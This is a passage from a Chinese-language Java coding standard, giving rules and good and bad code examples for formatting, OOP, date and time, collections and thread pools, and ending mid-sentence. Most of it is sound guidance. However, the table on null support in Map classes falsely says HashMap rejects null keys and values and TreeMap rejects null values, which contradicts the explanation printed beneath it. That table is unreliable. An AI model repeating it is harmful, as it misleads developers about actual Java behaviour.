\n   //  超过 120 个字符的情况下，不要在括号前换行 \n   sb.append(\"you\").append(\"are\")...append \n       (\"lucky\"); \n   //  参数很多的方法调用可能超过 120 个字符，逗号后才是换行处 \n   method(args1, args2, args3, ... \n       , argsX);\n   ```\n\n9. <font color=\" #C00000\">【强制】</font>方法参数在定义和传入时，多个参数逗号后面必须加空格。\n\n   <font color=\"#019858\">正例：</font>下例中实参的 args1，后边必须要有一个空格。\n\n   ```java\n   method(args1, args2, args3);  \n   ```\n\n10. <font color=\" #C00000\">【强制】</font>IDE的 text file encoding 设置为 UTF-8; IDE中文件的换行符使用 Unix 格式，不要 使用 Windows 格式。 \n\n11. <font color=\" #FFC000\">【推荐】</font>单个方法的总行数不超过 80 行。 \n\n    <font color=\" #977C00\">说明：</font>除注释之外的方法签名、左右大括号、方法内代码、空行、回车及任何不可见字符的总行数不超过 80 行。\n\n    <font color=\"#019858\">正例：</font>代码逻辑分清红花和绿叶，个性和共性，绿叶逻辑单独出来成为额外方法，使主干代码更加清晰；共性逻辑抽取成为共性方法，便于复用和维护。\n\n12. <font color=\" #FFC000\">【推荐】</font>没有必要增加若干空格来使变量的赋值等号与上一行对应位置的等号对齐。 \n\n    <font color=\"#019858\">正例：</font>\n\n    ```java\n    int one = 1; \n    long two = 2L; \n    float three = 3F; \n    StringBuilder sb = new StringBuilder(); \n    ```\n\n    <font color=\" #977C00\">说明：</font>增加 sb 这个变量，如果需要对齐，则给 one、two、three 都要增加几个空格，在变量比较多的情 况下，是非常累赘的事情。\n\n13. <font color=\" #FFC000\">【推荐】</font>不同逻辑、不同语义、不同业务的代码之间插入一个空行分隔开来以提升可读性。 \n\n    <font color=\" #977C00\">说明：</font>任何情形，没有必要插入多个空行进行隔开。\n\n## (四)  OOP 规约\n\n1. <font color=\" #C00000\">【强制】</font>避免通过一个类的对象引用访问此类的静态变量或静态方法，无谓增加编译器解析成 本，直接用类名来访问即可。\n\n2. <font color=\" #C00000\">【强制】</font>所有的覆写方法，必须加@Override 注解。 \n\n   <font color=\" #977C00\">说明：</font>getObject()与 get0bject()的问题。一个是字母的 O，一个是数字的 0，加@Override 可以准确判 断是否覆盖成功。另外，如果在抽象类中对方法签名进行修改，其实现类会马上编译报错。\n\n3. <font color=\" #C00000\">【强制】</font>相同参数类型，相同业务含义，才可以使用 Java 的可变参数，避免使用 Object。\n\n   <font color=\" #977C00\">说明：</font>可变参数必须放置在参数列表的最后。（建议开发者尽量不用可变参数编程）\n\n   <font color=\"#019858\">正例：</font>public List<User> listUsers(String type, Long... ids) {...} \n\n4. <font color=\" #C00000\">【强制】</font>外部正在调用或者二方库依赖的接口，不允许修改方法签名，避免对接口调用方产生 影响。接口过时必须加@Deprecated 注解，并清晰地说明采用的新接口或者新服务是什么。\n\n5. <font color=\" #C00000\">【强制】</font>不能使用过时的类或方法。\n\n   <font color=\" #977C00\">说明：</font>java.net.URLDecoder  中的方法 decode(String encodeStr)  这个方法已经过时，应该使用双参数 decode(String source, String encode)。接口提供方既然明确是过时接口，那么有义务同时提供新的接口； 作为调用方来说，有义务去考证过时方法的新实现是什么。\n\n6. <font color=\" #C00000\">【强制】</font>Object 的 equals 方法容易抛空指针异常，应使用常量或确定有值的对象来调用 equals。     \n\n   <font color=\"#019858\">正例：</font>\"test\".equals(object);\n\n   <font color=\" #FF4500\">反例：</font>object.equals(\"test\");\n\n   <font color=\" #977C00\">说明：</font>推荐使用 JDK7 引入的工具类 java.util.Objects#equals(Object a, Object b)\n\n7. <font color=\" #C00000\">【强制】</font>所有整型包装类对象之间<font color=\"#0000FF\">值的比较</font>，全部使用 equals 方法比较。 \n\n   <font color=\" #977C00\">说明：</font>对于 Integer var = ?  在<font color=\"#0000FF\">-128 至 127</font> 之间的赋值，Integer 对象是在  IntegerCache.cache 产生， 会复用已有对象，这个区间内的 Integer 值可以直接使用==进行判断，但是这个区间之外的所有数据，都会在堆上产生，并不会复用已有对象，这是一个大坑，推荐使用 equals 方法进行判断。\n\n8. <font color=\" #C00000\">【强制】</font>任何货币金额，均以最小货币单位且整型类型来进行存储。\n\n9. <font color=\" #C00000\">【强制】</font>浮点数之间的等值判断，基本数据类型不能用==来比较，包装数据类型不能用 equals 来判断。 \n\n   <font color=\" #977C00\">说明：</font>浮点数采用“**尾数+阶码**”的编码方式，类似于科学计数法的“有效数字+指数”的表示方式。二进制无法精确表示大部分的十进制小数，具体原理参考《码出高效》\n\n   <font color=\" #FF4500\">反例：</font>\n\n   ```java\n   float a = 1.0F - 0.9F;\n   float b = 0.9F - 0.8F;\n   if (a == b) {\n       // 预期进入此代码块，执行其它业务逻辑\n       // 但事实上a==b的结果为false\n   }\n   Float x = Float.valueOf(a);\n   Float y = Float.valueOf(b);\n   if (x.equals(y)) {\n       // 预期进入此代码块，执行其它业务逻辑\n       // 但事实上equals的结果为false\n   }\n   ```\n\n   <font color=\"#019858\">正例：</font>\n\n   1. 指定一个误差范围，两个浮点数的差值在此范围之内，则认为是相等的。 \n\n      ```java\n      float a = 1.0F - 0.9F;\n      float b = 0.9F - 0.8F;\n      float diff = 1e-6F;\n      if (Math.abs(a - b) < diff) {\n          System.out.println(\"true\");\n      }\n      ```\n\n   2. 使用 BigDecimal 来定义值，再进行浮点数的运算操作。 \n\n      ```java\n      BigDecimal a = new BigDecimal(\"1.0\");\n      BigDecimal b = new BigDecimal(\"0.9\");\n      BigDecimal c = new BigDecimal(\"0.8\");\n      BigDecimal x = a.subtract(b);\n      BigDecimal y = b.subtract(c);\n      if (x.compareTo(y) == 0) {\n          System.out.println(\"true\");\n      }\n      ```\n\n10. <font color=\" #C00000\">【强制】</font>如上所示 BigDecimal 的等值比较应使用 `compareTo()`方法，而不是 equals()方法。 \n\n    <font color=\" #977C00\">说明：</font>equals()方法会比较值和精度（1.0 与 1.00 返回结果为 false），而 compareTo()则会忽略精度。\n\n11. <font color=\" #C00000\">【强制】</font>定义数据对象 DO 类时，属性类型要与数据库字段类型相匹配。\n\n    <font color=\"#019858\">正例：</font>数据库字段的 bigint 必须与类属性的 Long 类型相对应。\n\n    <font color=\" #FF4500\">反例：</font>某个案例的数据库表 id 字段定义类型 bigint unsigned，实际类对象属性为 Integer，随着 id 越来 越大，超过 Integer 的表示范围而溢出成为负数。 \n\n12. <font color=\" #C00000\">【强制】</font>禁止使用构造方法 BigDecimal(double)的方式把 double 值转化为 BigDecimal 对象。    \n\n    <font color=\" #977C00\">说明：</font>BigDecimal(double)存在精度损失风险，在精确计算或值比较的场景中可能会导致业务逻辑异常。\n\n    如：BigDecimal g = new BigDecimal(0.1F);  实际的存储值为：0.10000000149\n\n    <font color=\"#019858\">正例：</font>优先推荐入参为 String 的构造方法，或使用 BigDecimal 的 valueOf 方法，此方法内部其实执行了 Double 的 toString，而 Double 的 toString 按 double 的实际能表达的精度对尾数进行了截断。\n\n    ```java\n    BigDecimal recommend1 = new BigDecimal(\"0.1\");\n    BigDecimal recommend2 = BigDecimal.valueOf(0.1);\n    ```\n\n13. 关于基本数据类型与包装数据类型的使用标准如下：\n\n    1）  <font color=\" #C00000\">【强制】</font>所有的 POJO 类属性必须使用包装数据类型。\n\n    2）  <font color=\" #C00000\">【强制】</font>RPC 方法的返回值和参数必须使用包装数据类型。\n\n    3）  <font color=\" #FFC000\">【推荐】</font>所有的局部变量使用基本数据类型。\n\n    <font color=\" #977C00\">说明：</font>POJO 类属性没有初值是提醒使用者在需要使用时，必须自己显式地进行赋值，任何 NPE 问题，或者入库检查，都由使用者来保证。\n\n    <font color=\"#019858\">正例：</font>数据库的查询结果可能是 null，因为自动拆箱，用基本数据类型接收有 NPE 风险。    \n\n    <font color=\" #FF4500\">反例：</font>某业务的交易报表上显示成交总额涨跌情况，即正负 x%，x 为基本数据类型，调用的 RPC 服务，调用不成功时，返回的是默认值，页面显示为 0%，这是不合理的，应该显示成中划线-。==所以包装数据类型 的 null 值，能够表示额外的信息，如：远程调用失败，异常退出。==\n\n14. <font color=\" #C00000\">【强制】</font>定义 DO/DTO/VO 等 POJO 类时，不要设定任何属性默认值。 \n\n    <font color=\" #FF4500\">反例：</font>POJO 类的 createTime 默认值为 new Date()，但是这个属性在数据提取时并没有置入具体值，在更新其它字段时又附带更新了此字段，导致创建时间被修改成当前时间\n\n15. <font color=\" #C00000\">【强制】</font>序列化类新增属性时，请不要修改 serialVersionUID 字段，避免反序列失败；如果完全不兼容升级，避免反序列化混乱，那么请修改 serialVersionUID 值。 \n\n    <font color=\" #977C00\">说明：</font>注意 serialVersionUID 不一致会抛出序列化运行时异常。\n\n16. <font color=\" #C00000\">【强制】</font>构造方法里面禁止加入任何业务逻辑，如果有初始化逻辑，请放在 init 方法中。 \n\n17. <font color=\" #C00000\">【强制】</font>POJO 类必须写 toString 方法。使用 IDE 中的工具：source > generate toString 时，如果继承了另一个 POJO 类，注意在前面加一下 super.toString。 \n\n    <font color=\" #977C00\">说明：</font>在方法执行抛出异常时，可以直接调用 POJO 的 toString()方法打印其属性值，便于排查问题。\n\n18. <font color=\" #C00000\">【强制】</font>禁止在 POJO 类中，同时存在对应属性 xxx 的 isXxx()和 getXxx()方法。 \n\n    <font color=\" #977C00\">说明：</font>框架在调用属性 xxx 的提取方法时，并不能确定哪个方法一定是被优先调用到的。\n\n19. <font color=\" #FFC000\">【推荐】</font>使用索引访问用 String 的 split 方法得到的数组时，需做最后一个分隔符后有无内容 的检查，否则会有抛 IndexOutOfBoundsException 的风险。 \n\n    <font color=\" #977C00\">说明：</font> \n\n    ```java\n    String str = \"a,b,c,,\";\n    String[] ary = str.split(\",\");\n    //  预期大于 3，结果是 3 \n    System.out.println(ary.length); \n    ```\n\n20. <font color=\" #FFC000\">【推荐】</font>当一个类有多个构造方法，或者多个同名方法，这些方法应该按顺序放置在一起，便于阅读，此条规则优先于下一条。 \n\n21. <font color=\" #FFC000\">【推荐】</font>  类内方法定义的顺序依次是：公有方法或保护方法  >  私有方法  > getter / setter 方法。 \n\n    <font color=\" #977C00\">说明：</font>公有方法是类的调用者和维护者最关心的方法，首屏展示最好；保护方法虽然只是子类关心，也可能是“模板设计模式”下的核心方法；而私有方法外部一般不需要特别关心，是一个黑盒实现；因为承载的信息价值较低，所有 Service 和 DAO 的 getter/setter 方法放在类体最后。\n\n22. <font color=\" #FFC000\">【推荐】</font>setter 方法中，参数名称与类成员变量名称一致，this.成员名  =  参数名。在 getter/setter 方法中，不要增加业务逻辑，增加排查问题的难度。 \n\n    <font color=\" #FF4500\">反例：</font>\n\n    ```java\n    public Integer getData () {\n        if (condition) {\n            return this.data + 100;\n        } else {\n            return this.data - 100;\n        }\n    }\n    ```\n\n23. <font color=\" #FFC000\">【推荐】</font>循环体内，字符串的连接方式，使用 StringBuilder 的 append 方法进行扩展。\n\n    <font color=\" #977C00\">说明：</font>下例中，反编译出的字节码文件显示每次循环都会 new 出一个 StringBuilder 对象，然后进行 append 操作，最后通过 toString 方法返回 String 对象，造成内存资源浪费。\n\n    <font color=\" #FF4500\">反例：</font> \n\n    ```java\n    String str = \"start\"; \n    \n    for (int i = 0; i < 100; i++) {      \n        str = str + \"hello\"; \n    }\n    ```\n\n24. <font color=\" #FFC000\">【推荐】</font>final 可以声明类、成员变量、方法、以及本地变量，下列情况使用 final 关键字： \n\n    1）  不允许被继承的类，如：String 类。 \n\n    2）  不允许修改引用的域对象，如：POJO 类的域变量。 \n\n    3）  不允许被覆写的方法，如：POJO 类的 setter 方法。 \n\n    4）  不允许运行过程中重新赋值的局部变量。 \n\n    5）  避免上下文重复使用一个变量，使用 final 关键字可以强制重新定义一个变量，方便更好地进行重构。\n\n25. <font color=\" #FFC000\">【推荐】</font>慎用 Object 的 clone 方法来拷贝对象。\n\n    <font color=\" #977C00\">说明：</font>对象 clone 方法默认是浅拷贝，若想实现深拷贝，需覆写 clone 方法实现域对象的深度遍历式拷贝。\n\n26. <font color=\" #FFC000\">【推荐】</font>类成员与方法访问控制从严：\n\n    1）  如果不允许外部直接通过 new 来创建对象，那么构造方法必须是 private。 \n\n    2）  工具类不允许有 public 或 default 构造方法。\n\n    3）  类非 static 成员变量并且与子类共享，必须是 protected。  \n\n    4）  类非 static 成员变量并且仅在本类使用，必须是 private。 \n\n    5）  类 static 成员变量如果仅在本类使用，必须是 private。 \n\n    6）  若是 static 成员变量，考虑是否为 final。 \n\n    7）  类成员方法只供类内部调用，必须是 private。  \n\n    8）  类成员方法只对继承类公开，那么限制为 protected。\n\n    ​    <font color=\" #977C00\">说明：</font>任何类、方法、参数、变量，严控访问范围。过于宽泛的访问范围，不利于模块解耦。思考：如果是一个 private 的方法，想删除就删除，可是一个 public 的 service 成员方法或成员变量，删除一下，不得手心冒点汗吗？变量像自己的小孩，尽量在自己的视线内，变量作用域太大，无限制的到处跑，那么你会担心的。\n\n## (五)  日期时间\n\n1. <font color=\" #C00000\">【强制】</font>日期格式化时，传入 pattern 中表示年份统一使用小写的 y。 \n\n   <font color=\" #977C00\">说明：</font>日期格式化时，yyyy 表示当天所在的年，而大写的 YYYY代表是 week in which year（JDK7 之后 引入的概念），意思是当天所在的周属于的年份，一周从周日开始，周六结束，只要本周跨年，返回的 YYYY 就是下一年。\n\n    <font color=\"#019858\">正例：</font>表示日期和时间的格式如下所示：\n\n   ```java\n   new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\")\n   ```\n\n2. <font color=\" #C00000\">【强制】</font>在日期格式中分清楚大写的 M 和小写的 m，大写的 H 和小写的 h 分别指代的意义。\n\n   <font color=\" #977C00\">说明：</font>日期格式中的这两对字母表意如下：  \n\n   1）  表示月份是大写的 M； \n\n    2）  表示分钟则是小写的 m； \n\n    3）  24 小时制的是大写的 H； \n\n    4）  12 小时制的则是小写的 h。  \n\n3. <font color=\" #C00000\">【强制】</font>获取当前毫秒数：System.currentTimeMillis();  而不是 new Date().getTime()。\n\n   <font color=\" #977C00\">说明：</font>如果想获取更加精确的纳秒级时间值，使用 System.nanoTime 的方式。在 JDK8 中，针对统计时间 等场景，推荐使用 `Instant `类。\n\n4. <font color=\" #C00000\">【强制】</font>不允许在程序任何地方中使用：\n\n   1）java.sql.Date  ：不记录时间，getHours()抛出异常\n\n   2）java.sql.Time ：不记录日期，getYear()抛出异常\n\n   3）java.sql.Timestamp：构造方法 super((time/1000)\\*1000)，在 Timestamp 属性 fastTime 和 nanos 分别存储秒和纳秒信息\n\n   <font color=\" #FF4500\">反例：</font>  java.util.Date.after(Date)进行时间比较时，当入参是 java.sql.Timestamp时，会触发 JDK BUG(JDK9 已修复)，可能导致比较时的意外结果。 \n\n5. <font color=\" #C00000\">【强制】</font>不要在程序中写死一年为 365 天，避免在公历闰年时出现日期转换错误或程序逻辑 错误。\n\n   <font color=\"#019858\">正例：</font> \n\n   ```java\n   //  获取今年的天数 \n   int daysOfThisYear = LocalDate.now().lengthOfYear();\n   //  获取指定某年的天数 \n   LocalDate.of(2011, 1, 1).lengthOfYear();\n   ```\n\n   <font color=\" #FF4500\">反例：</font>\n\n   ```java\n   //  第一种情况：在闰年 366 天时，出现数组越界异常 \n   int[] dayArray = new int[365];  \n   \n   //  第二种情况：一年有效期的会员制，今年 1 月 26 日注册，硬编码 365 返回的却是 1 月 25 日 \n   Calendar calendar = Calendar.getInstance(); \n   calendar.set(2020, 1, 26);  \n   calendar.add(Calendar.DATE, 365);  \n   ```\n\n6. <font color=\" #FFC000\">【推荐】</font>避免公历闰年 2 月问题。闰年的 2 月份有 29 天，一年后的那一天不可能是 2 月 29 日。\n\n7. <font color=\" #FFC000\">【推荐】</font>使用枚举值来指代月份。如果使用数字，注意 Date，Calendar 等日期相关类的月份 month 取值在 0-11 之间。 \n\n   <font color=\" #977C00\">说明：</font>参考 JDK 原生注释，Month value is 0-based. e.g., 0 for January.\n\n   <font color=\"#019858\">正例：</font> Calendar.JANUARY，Calendar.FEBRUARY，Calendar.MARCH 等来指代相应月份来进行传参或比较。 \n\n## (六)  集合处理  \n\n1. <font color=\" #C00000\">【强制】</font>关于 hashCode 和 equals 的处理，遵循如下规则：\n\n   - 只要覆写 equals，就必须覆写 hashCode。 \n   - 因为 Set 存储的是不重复的对象，依据 hashCode 和 equals 进行判断，所以 Set 存储的对象必须覆写这两种方法。\n   - 如果自定义对象作为 Map 的键，那么必须覆写 hashCode 和 equals。 \n\n    <font color=\" #977C00\">说明：</font>String 因为覆写了 hashCode 和 equals 方法，所以可以愉快地将 String 对象作为 key 来使用。 \n\n2. <font color=\" #C00000\">【强制】</font>判断所有集合内部的元素是否为空，使用 isEmpty()方法，而不是 size()==0 的方式。 \n\n   <font color=\" #977C00\">说明：</font>在某些集合中，前者的时间复杂度为 O(1)，而且可读性更好。\n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   Map<String, Object> map = new HashMap<>(16);\n   if (map.isEmpty()) {\n       System.out.println(\"no element in this map.\");\n   }\n   ```\n\n3. <font color=\" #C00000\">【强制】</font>在使用 java.util.stream.Collectors 类的 toMap()方法转为 Map 集合时，一定要使用含有参数`BinaryOperator<U> mergeFunction` 的方法，用于说明key重复时的策略，否则当出现相同 key 值时会抛出 IllegalStateException 异常。 \n\n   <font color=\" #977C00\">说明：</font>参数 mergeFunction 的作用是当出现 key 重复时，自定义对 value 的处理策略。\n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   List<Pair<String, Double>> pairArrayList = new ArrayList<>(3);\n   pairArrayList.add(new Pair<>(\"version\", 12.10));\n   pairArrayList.add(new Pair<>(\"version\", 12.19));\n   pairArrayList.add(new Pair<>(\"version\", 6.28));\n   //  生成的 map 集合中只有一个键值对：{version=6.28}\n   Map<String, Double> map = pairArrayList.stream().collect(\n           Collectors.toMap(Pair::getKey, Pair::getValue, (v1, v2) -> v2));\n   System.out.println(map);\n   ```\n\n   <font color=\" #FF4500\">反例：</font> \n\n   ```java\n    String[] departments = new String[]{\"iERP\", \"iERP\", \"EIBU\"};\n    //  抛出 IllegalStateException 异常\n    Map<Integer, String> map = Arrays.stream(departments)\n            .collect(Collectors.toMap(String::hashCode, str -> str));\n   ```\n\n4. <font color=\" #C00000\">【强制】</font>在使用 java.util.stream.Collectors 类的 toMap()方法转为 Map 集合时，一定要注意当 value 为 null 时会抛 NPE 异常。 \n\n   <font color=\" #977C00\">说明：</font>在 java.util.HashMap 的 merge 方法里会进行如下的判断：\n\n   ```java\n   if (value == null || remappingFunction == null) \n       throw new NullPointerException(); \n   ```\n\n   <font color=\" #FF4500\">反例：</font>\n\n   ```java\n   List<Pair<String, Double>> pairArrayList = new ArrayList<>(2);\n   pairArrayList.add(new Pair<>(\"version1\", 8.3));\n   pairArrayList.add(new Pair<>(\"version2\", null));\n   //  抛出 NullPointerException 异常\n   Map<String, Double> map = pairArrayList.stream().collect(\n           Collectors.toMap(Pair::getKey, Pair::getValue, (v1, v2) -> v2));\n   ```\n\n5. <font color=\" #C00000\">【强制】</font>ArrayList 的 subList 结果不可强转成 ArrayList，否则会抛出 ClassCastException 异 常：`java.util.RandomAccessSubList cannot be cast to java.util.ArrayList`\n\n   <font color=\" #977C00\">说明：</font>==subList()返回的是 ArrayList 的内部类 SubList==，并不是  ArrayList 本身，而是 ArrayList  的一个视 图，对于 SubList 的所有操作最终会反映到原列表上。\n\n6. <font color=\" #C00000\">【强制】</font>使用 Map 的方法` keySet()/values()/entrySet()`返回集合对象时，不可以对其进行添加元素操作，否则会抛出 UnsupportedOperationException 异常。 \n\n7. <font color=\" #C00000\">【强制】</font>Collections 类返回的对象，如：`emptyList()/singletonList()`等都是 immutable list， 不可对其进行添加或者删除元素的操作。\n\n   <font color=\" #FF4500\">反例：</font>如果查询无结果，返回 Collections.emptyList() 空集合对象，调用方一旦进行了添加元素的操作，就会触发 UnsupportedOperationException 异常。\n\n8. <font color=\" #C00000\">【强制】</font>在 subList 场景中，<font color=\"#0000FF\">高度注意</font>对父集合元素的增加或删除，均会导致子列表的遍历、 增加、删除产生 ConcurrentModificationException  异常。 \n\n9. <font color=\" #C00000\">【强制】</font>使用集合转数组的方法，必须使用集合的 toArray(T[] array)，传入的是类型完全一 致、长度为 0 的空数组。\n\n   <font color=\" #FF4500\">反例：</font>直接使用 toArray 无参方法存在问题，此方法返回值只能是 Object[]类，若强转其它类型数组将出现 ClassCastException 错误。 \n\n   <font color=\"#019858\">正例：</font>\n\n   ```java\n   List<String> list = new ArrayList<>(2);\n   list.add(\"guan\");\n   list.add(\"bao\");\n   String[] array = list.toArray(new String[0])\n   ```\n\n   <font color=\" #977C00\">说明：</font>使用 toArray 带参方法，数组空间大小的 length\n\n   1） <font color=\"#0000FF\">等于 0</font>，动态创建与 size 相同的数组，性能最好。\n\n   2）  <font color=\"#0000FF\">大于 0 但小于 size</font>，重新创建大小等于 size 的数组，增加 GC 负担。 \n\n   3）  <font color=\"#0000FF\">等于 size</font>，在高并发情况下，数组创建完成之后，size 正在变大的情况下，负面影响与 2 相同。 \n\n   4）  <font color=\"#0000FF\">大于 size</font>，空间浪费，且在 size 处插入 null 值，存在 NPE 隐患。 \n\n10. <font color=\" #C00000\">【强制】</font>在使用 Collection 接口任何实现类的 addAll()方法时，都要对输入的集合参数进行 NPE 判断。 \n\n    <font color=\" #977C00\">说明：</font>在 ArrayList#addAll 方法的第一行代码即 Object[] a = c.toArray(); 其中 c 为输入集合参数，如果 为 null，则直接抛出异常。\n\n11. <font color=\" #C00000\">【强制】</font>使用工具类 Arrays.asList()把数组转换成集合时，不能使用其修改集合相关的方法， 它的 `add/remove/clear` 方法会抛出 UnsupportedOperationException 异常。 \n\n    <font color=\" #977C00\">说明：</font>==asList 的返回对象是一个 Arrays 内部类，并没有实现集合的修改方法。Arrays.asList 体现的是适配器模式，只是转换接口，后台的数据仍是数组==\n\n    ```java\n    String[] str = new String[]{\"chen\", \"yang\", \"hao\"};\n    List<String> list = Arrays.asList(str);\n    // 第一种情况：list也会随之修改，反之亦然。\n    str[0] = \"change\";\n    System.out.println(list.get(0));\n    // 第二种情况：运行时异常\n    list.add(\"yangguanbao\");\n    ```\n\n12. <font color=\" #C00000\">【强制】</font>泛型通配符`<? extends T>`来接收返回的数据，此写法的泛型集合不能使用 add 方法， 而`<? super T>`不能使用 get 方法，两者在接口调用/赋值的场景中容易出错。 \n\n     <font color=\" #977C00\">说明：</font>扩展说一下 ==PECS(Producer Extends Consumer Super)原则==\n\n     第一、频繁往外读取内容的，适合用 <? extends T>\n\n     第二、经常往里插入的，适合用<? super T> \n\n13. <font color=\" #C00000\">【强制】</font>在无泛型限制定义的集合赋值给泛型限制的集合时，在使用集合元素时，需要进行 instanceof 判断，避免抛出 ClassCastException 异常。 \n\n    <font color=\" #977C00\">说明：</font>毕竟泛型是在 JDK5 后才出现，考虑到向前兼容，编译器是允许非泛型集合与泛型集合互相赋值。\n\n    <font color=\" #FF4500\">反例：</font>\n\n    ```java\n    List<String> generics = null;\n    List notGenerics = new ArrayList(10);\n    notGenerics.add(new Object());\n    notGenerics.add(new Integer(1));\n    generics = notGenerics;\n    //  此处抛出 ClassCastException 异常\n    String string = generics.get(0);\n    ```\n\n14. <font color=\" #C00000\">【强制】</font>不要在 foreach 循环里进行元素的 remove/add 操作。remove 元素请使用 Iterator 方式，如果并发操作，需要对 Iterator 对象加锁。\n\n     <font color=\"#019858\">正例：</font> \n\n     ```java\n    List<String> list = new ArrayList<>();\n    list.add(\"1\");\n    list.add(\"2\");\n    Iterator<String> iterator = list.iterator();\n    while (iterator.hasNext()) {\n        String item = iterator.next();\n        if (删除元素的条件) {\n            iterator.remove();\n        }\n    }\n     ```\n\n     <font color=\" #FF4500\">反例：</font> \n\n     ```java\n    for (String item : list) {\n        if (\"1\".equals(item)) {\n            // 正常remove\n            list.remove(item);\n        }\n    }\n     ```\n\n     <font color=\" #977C00\">说明：</font>以上代码的执行结果肯定会出乎大家的意料，那么试一下把“1”换成“2”，会是同样的结果吗？\n\n15. <font color=\" #C00000\">【强制】</font>在 JDK7 版本及以上，Comparator 实现类要满足如下三个条件，不然 Arrays.sort， Collections.sort 会抛 IllegalArgumentException 异常。 \n\n    <font color=\" #977C00\">说明：</font>三个条件如下 \n\n    1）  x，y 的比较结果和 y，x 的比较结果相反。\n\n    2）  x>y，y>z，则 x>z。 \n\n    3）  x=y，则 x，z 比较结果和 y，z 比较结果相同。    \n\n    <font color=\" #FF4500\">反例：</font>下例中没有处理相等的情况，交换两个对象判断结果并不互反，不符合第一个条件，在实际使用中    可能会出现异常。\n\n    ```java\n    new Comparator<Student>() {\n        @Override\n        public int compare(Student o1, Student o2) {\n            return o1.getId() > o2.getId() ? 1 : -1;\n        }\n    };\n    ```\n\n16. <font color=\" #FFC000\">【推荐】</font>集合泛型定义时，在 JDK7 及以上，使用 diamond 语法或全省略。 \n\n    <font color=\" #977C00\">说明：</font>菱形泛型，即 diamond，直接使用<>来指代前边已经指定的类型。\n\n    <font color=\"#019858\">正例：</font> \n\n    ```java\n    HashMap<String, String> userCache = new HashMap<>(16); //  全省略方式\n    ArrayList<User> users = new ArrayList(10); \n    ```\n\n17. <font color=\" #FFC000\">【推荐】</font>集合初始化时，指定集合初始值大小。\n\n     <font color=\" #977C00\">说明：</font>HashMap 使用 `HashMap(int initialCapacity) ` 初始化，如果暂时无法确定集合大小，那么指定默 认值（16）即可。\n\n     <font color=\"#019858\">正例：</font>==initialCapacity = (需要存储的元素个数  /  负载因子) + 1==。注意负载因子（即 loader factor）默认 为 0.75，如果暂时无法确定初始值大小，请设置为 16（即默认值）。\n\n     <font color=\" #FF4500\">反例：</font>  HashMap 需要放置 1024 个元素，由于没有设置容量初始大小，随着元素增加而被迫不断扩容， resize()方法总共会调用 8 次，反复重建哈希表和数据迁移。当放置的集合元素个数达千万级时会影响程序性能。 \n\n18. <font color=\" #FFC000\">【推荐】</font>使用 entrySet 遍历 Map 类集合 KV，而不是 keySet 方式进行遍历\n\n    <font color=\" #977C00\">说明：</font>keySet 其实是遍历了 2 次，一次是转为 Iterator 对象，另一次是从 hashMap 中取出 key 所对应的 value。而 entrySet 只是遍历了一次就把 key 和 value 都放到了 entry 中，效率更高。如果是 JDK8，使用 Map.forEach 方法。 \n\n    <font color=\"#019858\">正例：</font>values()返回的是 V值集合，是一个 list 集合对象；keySet()返回的是 K值集合，是一个 Set 集合对象；entrySet()返回的是 K-V值组合集合。\n\n19. <font color=\" #FFC000\">【推荐】</font>高度注意 Map 类集合 K/V 能不能存储 null 值的情况，如下表格：\n\n    | 集合类            | Key                                     | Value                                   | Super       | 说明                   |\n    | ----------------- | --------------------------------------- | --------------------------------------- | ----------- | ---------------------- |\n    | Hashtable         | <font color=\"red\">不允许为 null</font>  | <font color=\"red\">不允许为 null</font>  | Dictionary  | 线程安全               |\n    | ConcurrentHashMap | <font color=\"red\">不允许为 null</font>  | <font color=\"red\">不允许为 null</font>  | AbstractMap | 锁分段技术（JDK8:CAS） |\n    | TreeMap           | <font color=\"red\">不允许为 null</font>  | <font color=\"blue\">不允许为 null</font> | AbstractMap | 线程不安全             |\n    | HashMap           | <font color=\"blue\">不允许为 null</font> | <font color=\"blue\">不允许为 null</font> | AbstractMap | 线程不安全             |\n\n    <font color=\" #FF4500\">反例：</font>由于 HashMap 的干扰，很多人认为 ConcurrentHashMap 是可以置入 null 值，而事实上，存储 null 值时会抛出 NPE 异常。\n\n20. <font color=\"#76923C\">【参考】</font>合理利用好集合的有序性(sort)和稳定性(order)，避免集合的无序性(unsort)和不稳 定性(unorder)带来的负面影响。\n\n    <font color=\" #977C00\">说明：</font>有序性是指遍历的结果是按某种比较规则依次排列的。稳定性指集合每次遍历的元素次序是一定的。 如：ArrayList 是 order/unsort；HashMap 是 unorder/unsort；TreeSet 是 order/sort。\n\n21. <font color=\"#76923C\">【参考】</font>利用 Set 元素唯一的特性，可以快速对一个集合进行去重操作，避免使用 List 的 contains()进行遍历去重或者判断包含操作。 \n\n## (七)  并发处理\n\n1. <font color=\" #C00000\">【强制】</font>获取单例对象需要保证线程安全，其中的方法也要保证线程安全。\n\n   <font color=\" #977C00\">说明：</font>资源驱动类、工具类、单例工厂类都需要注意。\n\n2. <font color=\" #C00000\">【强制】</font>创建线程或线程池时请指定有意义的线程名称，方便出错时回溯。\n\n   <font color=\"#019858\">正例：</font>自定义线程工厂，并且根据外部特征进行分组，比如，来自同一机房的调用，把机房编号赋值给 whatFeatureOfGroup\n\n   ```java\n   public class UserThreadFactory implements ThreadFactory {\n       private final String namePrefix;\n       private final AtomicInteger nextId = new AtomicInteger(1);\n       //  定义线程组名称，在利用 jstack 来排查问题时，非常有帮助\n       UserThreadFactory(String whatFeatureOfGroup) {\n           namePrefix = \"From UserThreadFactory's \" + whatFeatureOfGroup + \"-Worker-\";\n       }\n       @Override\n       public Thread newThread(Runnable task) {\n           String name = namePrefix + nextId.getAndIncrement();\n           Thread thread = new Thread(null, task, name, 0);\n           System.out.println(thread.getName());\n           return thread;\n       }\n   }\n   ```\n\n3. <font color=\" #C00000\">【强制】</font>线程资源必须通过线程池提供，不允许在应用中自行显式创建线程。\n\n   <font color=\" #977C00\">说明：</font>线程池的好处是减少在创建和销毁线程上所消耗的时间以及系统资源的开销，解决资源不足的问题。 如果不使用线程池，有可能造成系统创建大量同类线程而导致消耗完内存或者“过度切换”的问题。\n\n4. <font color=\" #C00000\">【强制】</font>线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。\n\n   <font color=\" #977C00\">说明：</font>Executors 返回的线程池对象的弊端如下： \n\n   1）  `FixedThreadPool `和 `SingleThreadPool`： \n\n   允许的请求队列长度为 Integer.MAX\\_VALUE，可能会堆积大量的请求，从而导致 OOM。 \n\n   2）  `CachedThreadPool`： \n\n   允许的创建线程数量为 